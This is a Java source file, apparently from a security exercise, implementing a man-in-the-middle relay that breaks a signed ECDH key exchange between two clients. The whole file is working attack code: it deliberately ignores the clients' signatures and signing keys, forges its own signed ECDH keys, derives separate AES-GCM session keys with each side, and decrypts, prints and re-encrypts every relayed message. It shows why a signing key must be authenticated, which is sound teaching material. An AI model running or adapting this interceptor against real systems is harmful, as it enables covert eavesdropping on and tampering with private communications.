import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.MessageDigest;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.Signature;
import java.security.spec.X509EncodedKeySpec;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.KeyAgreement;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class ServerInterceptor {

    private KeyPair mitmECDHForClient1;
    private KeyPair mitmECDHForClient2;
    private KeyPair mitmECDSA;

    private SecretKeySpec aesKeyWithClient1;
    private SecretKeySpec aesKeyWithClient2;

    private boolean client1HandshakeDone = false;
    private boolean client2HandshakeDone = false;

    public ServerInterceptor() {
        System.out.println("[Server] MITM signed-handshake attack mode");

        try {
            KeyPairGenerator ecGen = KeyPairGenerator.getInstance("EC");
            ecGen.initialize(256);

            mitmECDHForClient1 = ecGen.generateKeyPair();
            mitmECDHForClient2 = ecGen.generateKeyPair();
            mitmECDSA = ecGen.generateKeyPair();

        } catch (Exception e) {
            throw new RuntimeException("Failed to initialize MITM keys", e);
        }
    }

    public String onMessageRelay(String message, int fromClient, int toClient) {
        try {
            System.out.println("[MITM] Intercepted from " + fromClient + " to " + toClient + ": " + message);

            if (isSignedHandshakeMessage(message)) {
                return handleSignedHandshake(message, fromClient, toClient);
            }

            return handleEncryptedMessage(message, fromClient, toClient);

        } catch (Exception e) {
            System.out.println("[MITM] Error: " + e.getMessage());
            e.printStackTrace();
            return message;
        }
    }

    private boolean isSignedHandshakeMessage(String message) {
        String[] parts = message.split(":");
        return parts.length == 3;
    }

    private String handleSignedHandshake(String message, int fromClient, int toClient) throws Exception {
        System.out.println("[MITM] Intercepted signed ECDH handshake from client " + fromClient);

        String[] parts = message.split(":");
        String clientECDHPubB64 = parts[0];
        // parts[1] = signature du client
        // parts[2] = clé publique ECDSA du client
        // on les ignore volontairement pour l'attaque

        byte[] clientECDHPubBytes = Base64.getDecoder().decode(clientECDHPubB64);

        KeyFactory kf = KeyFactory.getInstance("EC");
        X509EncodedKeySpec ecdhSpec = new X509EncodedKeySpec(clientECDHPubBytes);
        PublicKey clientECDHPublicKey = kf.generatePublic(ecdhSpec);

        if (fromClient == 1 && !client1HandshakeDone) {
            aesKeyWithClient1 = deriveAesKeyFromECDH(clientECDHPublicKey, mitmECDHForClient1);
            client1HandshakeDone = true;
            System.out.println("[MITM] Shared secret established with client 1");

            return forgeHandshakeForClient(mitmECDHForClient2);
        }

        if (fromClient == 2 && !client2HandshakeDone) {
            aesKeyWithClient2 = deriveAesKeyFromECDH(clientECDHPublicKey, mitmECDHForClient2);
            client2HandshakeDone = true;
            System.out.println("[MITM] Shared secret established with client 2");

            return forgeHandshakeForClient(mitmECDHForClient1);
        }

        return message;
    }

    private String forgeHandshakeForClient(KeyPair mitmECDHKeyPair) throws Exception {
        byte[] ecdhPubBytes = mitmECDHKeyPair.getPublic().getEncoded();

        Signature sig = Signature.getInstance("SHA256withECDSA");
        sig.initSign(mitmECDSA.getPrivate());
        sig.update(ecdhPubBytes);
        byte[] signatureBytes = sig.sign();

        String ecdhPubB64 = Base64.getEncoder().encodeToString(ecdhPubBytes);
        String sigB64 = Base64.getEncoder().encodeToString(signatureBytes);
        String ecdsaPubB64 = Base64.getEncoder().encodeToString(mitmECDSA.getPublic().getEncoded());

        System.out.println("[MITM] Replacing ECDH public key + signature + ECDSA public key");

        return ecdhPubB64 + ":" + sigB64 + ":" + ecdsaPubB64;
    }

    private SecretKeySpec deriveAesKeyFromECDH(PublicKey otherPublicKey, KeyPair myKeyPair) throws Exception {
        KeyAgreement ka = KeyAgreement.getInstance("ECDH");
        ka.init(myKeyPair.getPrivate());
        ka.doPhase(otherPublicKey, true);
        byte[] sharedSecret = ka.generateSecret();

        MessageDigest sha = MessageDigest.getInstance("SHA-256");
        byte[] hash = sha.digest(sharedSecret);
        byte[] keyBytes = Arrays.copyOf(hash, 16);

        return new SecretKeySpec(keyBytes, "AES");
    }

    private String handleEncryptedMessage(String message, int fromClient, int toClient) throws Exception {
        if (aesKeyWithClient1 == null || aesKeyWithClient2 == null) {
            System.out.println("[MITM] Session keys not ready yet");
            return message;
        }

        String clearText;

        if (fromClient == 1 && toClient == 2) {
            clearText = decryptMessage(message, aesKeyWithClient1);
            System.out.println("[MITM] Message en clair de 1 vers 2 : " + clearText);
            return encryptMessage(clearText, aesKeyWithClient2);
        }

        if (fromClient == 2 && toClient == 1) {
            clearText = decryptMessage(message, aesKeyWithClient2);
            System.out.println("[MITM] Message en clair de 2 vers 1 : " + clearText);
            return encryptMessage(clearText, aesKeyWithClient1);
        }

        return message;
    }

    private String decryptMessage(String encryptedText, SecretKeySpec aesKey) throws Exception {
        String[] parts = encryptedText.split(":");
        byte[] iv = Base64.getDecoder().decode(parts[0]);
        byte[] cipherBytes = Base64.getDecoder().decode(parts[1]);

        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, aesKey, gcmSpec);

        byte[] decrypted = cipher.doFinal(cipherBytes);
        return new String(decrypted, "UTF-8");
    }

    private String encryptMessage(String plainText, SecretKeySpec aesKey) throws Exception {
        byte[] iv = new byte[12];
        SecureRandom random = new SecureRandom();
        random.nextBytes(iv);

        GCMParameterSpec gcmSpec = new GCMParameterSpec(128, iv);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, aesKey, gcmSpec);

        byte[] encrypted = cipher.doFinal(plainText.getBytes("UTF-8"));

        String ivBase64 = Base64.getEncoder().encodeToString(iv);
        String cipherBase64 = Base64.getEncoder().encodeToString(encrypted);

        return ivBase64 + ":" + cipherBase64;
    }
}